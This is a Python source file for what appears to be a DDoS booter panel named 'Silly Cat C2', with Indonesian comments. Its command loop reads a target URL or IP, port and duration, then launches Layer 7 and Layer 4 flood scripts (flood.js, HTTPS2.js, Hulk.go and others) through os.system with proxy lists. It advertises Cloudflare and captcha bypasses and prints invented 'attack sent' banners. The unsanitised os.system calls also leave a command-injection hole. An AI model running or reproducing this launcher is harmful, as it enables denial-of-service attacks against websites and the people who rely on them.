# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
from datetime import datetime

def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b %d %Y %H:%M:%S")


# Daftar negara
countries = ['Indonesia', 'Amerika Serikat', 'Inggris', 'Perancis', 'Jepang', 'Kanada', 'Australia']

# Memilih negara secara acak
random_country = random.choice(countries)


B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

def country():
    # Membuat daftar negara dan singkatannya
    countries = {
        "United States": "US",
        "United Kingdom": "UK",
        "Canada": "CA",
        "Australia": "AU",
        "Indonesia": "INA",
        # Tambahkan negara lain di sini sesuai kebutuhan
    }

def ongoing():
        print("""\033[37m
No attacks are executed. try to go home and try an attack(help)
""")

def Vip():
	print("""\033[37m
\033[32m                              Layer 7 Vip
\033[31m=============================             =============================
\033[37m  TLS          \033[35m    - Layer 7 - \033[36mBypass H.TTPDDOS
\033[37m  MIX          \033[35m    - Layer 7 - \033[36mCloudFlare, Good for CloudFlare
\033[37m  HTTPS2       \033[35m    - Layer 7 - \033[36mBypass Chaptcha, good for Hold
\033[37m  FLOOD        \033[35m    - Layer 7 - \033[36mBIG RPS, No HTTPDDOS
\033[31m=======================================================================

\033[32m                              Layer 4 Vip
\033[31m=============================             =============================
\033[37m  TCP          \033[35m    - Layer 4 - \033[36mTCP VIP
\033[31m=======================================================================

\033[35m Command :\033[37m [METHOD] [TARGET] [PORT] [TIME]
""")

def layer4():
	print("""\033[37m
""")

def help():
	print("""\033[37m
\033[36m┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[36m┣\033[32m        × Layer 7 ×
\033[36m┣➤\033[34mHTTPS       |\033[37m Maintenance
\033[36m┣➤\033[34mKILLNET     |\033[37m Maintenance
\033[36m┣➤\033[34mWORM        |\033[37m Maintenance
\033[36m┣➤\033[34mVIOLET      |\033[37m Maintenance
\033[36m┣➤\033[34mUAM         |\033[37m Maintenance
\033[36m┣➤\033[34mTLS-ZLOCRY  |\033[37m Maintenance
\033[36m┣➤\033[34mZEUS	      |\033[37m Maintenance
\033[36m┣➤\033[34mHENTAI      |\033[37m Maintenance
\033[36m┣➤\033[34mHTTPS-RIZ   |\033[37m Maintenance
\033[36m┣\033[32m        × Layer 4 ×
\033[36m┣➤\033[34mOVH         |\033[37m Maintenance
\033[36m┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛

\033[35m Command :\033[37m [METHOD] [TARGET] [PORT] [TIME]
""")

def menu():
    os.system ("clear")
    print("""\033[36m
\033[36m                 ╔═╗  ╦  ╦    ╦    ╦ ╦  ╔═╗  ╔═╗  ╔╦╗
\033[36m	         ╚═╗  ║  ║    ║    ╚╦╝  ║    ╠═╣   ║
\033[36m                 ╚═╝  ╩  ╩═╝  ╩═╝   ╩   ╚═╝  ╩ ╩   ╩
\033[32m           ╚╦═══════════════════════════════════════════╦╝
\033[32m       ╔════╩═══════════════════════════════════════════╩════╗
\033[32m       ║             WELCOME TO SILLY CAT C2 API🔥           ║
\033[32m       ║	     • Silly Cat & Bill & Cikoo •            ║
\033[32m       ╚═════════════════════════════════════════════════════╝

\033[32m          ╔═══════════════════════════════════════════════╗
\033[32m          ║-➤\033[34m Methods |\033[37m see methods\033[32m                       ║
\033[32m          ║-➤\033[34m Vip     |\033[37m see all vip methods\033[32m               ║
\033[32m          ║-➤\033[34m Plan    |\033[37m View your plan\033[32m                    ║
\033[32m          ╚═══════════════════════════════════════════════╝
""")



def main():

	while True:
		sys.stdout.write(f"\x1b]2;[/] ERORRXDDOSXBIL :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
		sin = input("\033[0;44;45mSILLY CAT\033[0;44;45m • Rizz\x1b[1;40m\033[0m ➤ \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			menu()
		if sinput == "cls" or sinput == "CLS":
			os.system ("pkill screen")
			os.system ("clear")
			menu()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			menu()			
		if sinput == "vip" or sinput == "vip" or sinput == ".VIP" or sinput == "VIP" or sinput == ".Vip" or sinput == "Vip":
			Vip()
		if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
			layer4()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "methods" or sinput == ".methods" or sinput == "METHODS" or sinput == ".METHODS":
			help()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########LAYER-4 - 7########
		elif sinput == "killnet" or sinput == "KILLNET":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node black-eye.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m killnet\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp" or sinput == "TCP":
			try:
				ip = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[4]
				os.system(f'screen -dm node TCP {method} {ip} {port} {time} 15000')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   IP:          \033[31m[ \033[36m{ip} \033[31m]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m tcp\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "flood" or sinput == "FLOOD":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node flood.js {url} {port} {time} 14')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status: 	\033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port: 	\033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time:    	\033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:  	\033[37m[\033[36m ara\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()

#########LAYER-7########  
		elif sinput == "httpsriz" or sinput == "HTTPSRIZ" or sinput == "https-riz" or sinput == "HTTPS-RIZ":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node https-riz.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m https-riz\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "https2" or sinput == "HTTPS2":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node HTTPS2.js {url} {time} 5 10 proxy.txt')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status: 	\033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:  	\033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port: 	\033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time: 	\033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:	\033[37m[\033[36m https2\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "mix" or sinput == "MIX":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node MIX.js {url} {port} {time} 14')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:	\033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:  	\033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port:  	\033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time:        \033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:	\033[37m[\033[36m mix\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlszlocry" or sinput == "TLSZLOCRY" or sinput == "tls-zlocry" or sinput == "TLS-ZLOCRY":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				rps = sin.split()[3]
				os.system(f'screen -dm node anus.js {url} {time} {rps} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   RPS:         \033[31m[\033[36m {rps}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m tls-zlocry\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bypass" or sinput == "BYPASS":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node BYPASS-ERORR.js {url} {port} {time} 14 proxy.txt')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status: 	\033[37m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port: 	\033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time: 	\033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:      \033[37m[\033[36m bypass\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "browser" or sinput == "BROWSER":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node BROWSER.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[ \033[36m{port}\033[31m ]
\033[1;37m   METHOD: 	\033[31m[\033[36m browser\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mERORR37\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls" or sinput == "TLS":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node tls.js {url} {port} {time} 10')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:	\033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:  	\033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port: 	\033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time: 	\033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:	\033[37m[\033[36m tls\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bomb" or sinput == "BOMB":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				method = sin.split()[3]
				os.system(f'screen -dm go run Coli.go -site {url} -data {method}')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m {method}\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "hentai" or sinput == "HENTAI":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node HENTAI.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST: 	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m hentai\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "worm" or sinput == "WORM":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node worm.js {url} {time} {port} 12 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m worm\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "strike" or sinput == "STRIKE":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node STRIKE.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m strike\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tlshold" or sinput == "TLSHOLD" or sinput == "tls-hold" or sinput == "TLS-HOLD":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node TLS-HOLD.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT: 	\033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m tls-hold\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "violet" or sinput == "VIOLET":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node VIOLET.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST: 	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:  	\033[31m[\033[36m violet\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "bomb2" or sinput == "BOMB2":
			try:
				url = sin.split()[1]
				method = sin.split()[2]
				os.system(f'screen -dm go run Hulk.go -site {url} -data {method}')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   SYSTEM:	\033[31m[\033[36m {method}\033[31m ]
\033[1;37m   METHOD: 	\033[31m[\033[36m bomb2\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "tlsv2" or sinput == "TLSV2":
			try:
				url = sin.split()[1]
				port = sin.split()[3]
				time = sin.split()[2]
				os.system(f'screen -dm node TLSV2.js {url} {port} {time} 14')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:      \033[37m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Port:        \033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Time:        \033[37m[\033[36m {port}\033[37m ]
\033[1;37m   Method:      \033[37m[\033[36m tlsv2\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "https" or sinput == "HTTPS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node cobra.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m https\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:        \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:         \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:     \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()			    
		elif sinput == "uam" or sinput == "UAM":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node UAM.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m uam\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "killneet" or sinput == "KILLNEET":
			try:
				host = sin.split()[1]
				port = sin.split()[2]
				time = sin.split()[3]
				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[1;37mKILLNET \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()			    			    
		elif sinput == "zeus" or sinput == "ZEUS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				port = sin.split()[3]
				os.system(f'screen -dm node ZEUS.js {url} {time} {port} 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m zeus\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
